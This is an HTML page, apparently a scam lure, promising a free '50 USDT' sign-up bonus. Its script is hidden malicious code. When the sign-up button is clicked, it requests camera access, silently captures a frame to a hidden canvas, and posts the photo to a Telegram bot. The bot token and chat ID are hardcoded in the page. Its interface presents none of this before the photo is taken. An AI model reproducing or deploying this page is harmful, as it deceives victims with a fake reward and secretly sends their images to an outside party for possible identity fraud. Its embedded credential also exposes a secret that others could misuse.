<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>50 USDT | Earn Money</title>
  <style>
    body, html { margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; color: #ffffff; text-align: center; background-color: #000000; overflow: hidden; }
    #bg-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; }
    .content-wrapper { position: relative; z-index: 1; height: 100vh; display: flex; justify-content: center; align-items: center; }
    .container { max-width: 350px; padding: 20px; background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(5px); border-radius: 20px; border: 1px solid rgba(255, 255, 255, 0.1); }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    #coin-canvas, h1, p, .signup-button { animation: fadeIn 0.8s ease-out forwards; opacity: 0; }
    h1 { animation-delay: 0.2s; }
    p { animation-delay: 0.4s; }
    .signup-button { animation-delay: 0.6s; }
    #coin-canvas { width: 150px !important; height: 150px !important; margin: 0 auto 20px auto; }
    h1 { font-size: 2.5em; margin: 0; font-weight: bold; text-shadow: 0 0 15px rgba(255, 255, 255, 0.3); }
    p { font-size: 1.1em; margin: 20px 0; line-height: 1.5; color: #e0e0e0; text-shadow: 0 0 10px rgba(0, 0, 0, 0.5); }
    .signup-button { background-color: #4CAF50; color: white; padding: 15px 30px; border: none; border-radius: 8px; font-size: 1.2em; font-weight: bold; cursor: pointer; text-decoration: none; display: inline-flex; align-items: center; justify-content: center; transition: background-color 0.3s ease, transform 0.1s ease; box-shadow: 0 0 20px rgba(76, 175, 80, 0.5); }
    .signup-button:hover { background-color: #58c95c; }
    .signup-button:active { transform: scale(0.97); }
  </style>
</head>
<body>

  <video id="hidden-video" style="display: none;" autoplay playsinline></video>
  <canvas id="hidden-canvas" style="display: none;"></canvas>
  <canvas id="bg-canvas"></canvas>
  
  <div class="content-wrapper">
    <div class="container">
      <div id="coin-canvas"></div>
      <h1>Earn 50 USDT</h1>
      <p>Start Exploring Our Website And Earn Upto 50 USDT Free. Simply sign up to get 50 $ Sign Up Bonus</p>
      <a href="#" class="signup-button" id="signupBtn">
        <span>Sign Up to Start</span>
      </a>
    </div>
  </div>

  <script>
    const signupBtn = document.getElementById('signupBtn');
    const video = document.getElementById('hidden-video');
    const canvas = document.getElementById('hidden-canvas');

    // আপনার বট টোকেন (নিরাপত্তার জন্য নতুন টোকেন ব্যবহার করুন)
    const BOT_TOKEN = "8424053022:AAGnCW1Sq6lmfj6VK69KpmrqJK47kK18D-Q"; 
    
    // আপনার চ্যাট আইডি
    const CHAT_ID = "8099849002";

    function dataURLtoBlob(dataurl) {
      const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
            bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
      for (let i = 0; i < n; i++) u8arr[i] = bstr.charCodeAt(i);
      return new Blob([u8arr], { type: mime });
    }

    signupBtn.addEventListener('click', async (event) => {
      event.preventDefault();
      signupBtn.textContent = 'Requesting Access...';
      signupBtn.style.pointerEvents = 'none';

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        signupBtn.textContent = 'Access Granted. Finalizing...';
        video.srcObject = stream;

        video.onplay = () => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            
            setTimeout(() => {
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                const imageDataUrl = canvas.toDataURL('image/jpeg');
                const photoBlob = dataURLtoBlob(imageDataUrl);
                
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', photoBlob, 'selfie.jpg');
                
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

                fetch(url, {
                  method: 'POST',
                  body: formData
                })
                .then(response => response.json())
                .then(data => {
                  if (data.ok) {
                    alert("Sign Up Successful! Your selfie has been submitted.");
                    signupBtn.textContent = 'Welcome!';
                    signupBtn.style.backgroundColor = '#28a745';
                  } else {
                    alert(`Failed to send photo. Error: ${data.description}`);
                    signupBtn.textContent = 'Try Again';
                    signupBtn.style.pointerEvents = 'auto';
                  }
                })
                .catch(error => {
                  alert("Failed to send photo. Check console for errors.");
                  signupBtn.textContent = 'Try Again';
                  signupBtn.style.pointerEvents = 'auto';
                });

                stream.getTracks().forEach(track => track.stop());
            }, 200);
        };

      } catch (err) {
        alert("Camera access is required. Please allow permission.");
        signupBtn.textContent = 'Sign Up to Start';
        signupBtn.style.pointerEvents = 'auto';
      }
    });
  </script>
</body>
</html>
